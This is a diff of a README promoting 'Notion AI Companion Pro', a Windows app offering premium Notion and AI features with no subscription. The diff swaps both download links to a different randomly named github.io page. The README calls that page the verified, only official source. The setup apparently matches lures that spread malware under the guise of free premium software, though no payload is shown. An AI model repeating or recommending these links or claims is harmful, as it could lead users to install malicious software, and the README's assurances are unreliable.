@@ -2,7 +2,7 @@
 
 Notion AI Companion Pro is a cutting-edge Windows desktop application designed to elevate your Notion experience with AI-powered assistance and premium features. Released in 2026, this tool helps you manage templates, automate tasks, and optimize your workflow without needing a subscription, making it perfect for professionals and students alike.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -63,7 +63,7 @@ A: Yes, you can install Notion AI Companion Pro on as many Windows 10 or 11 devi
 
 To get started with Notion AI Companion Pro and unlock its full potential, download the installer from the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This link leads to the verified download page where you can access the current version released in 2026. Remember, this is the only official source to ensure you receive a safe and up-to-date copy of the tool.
 
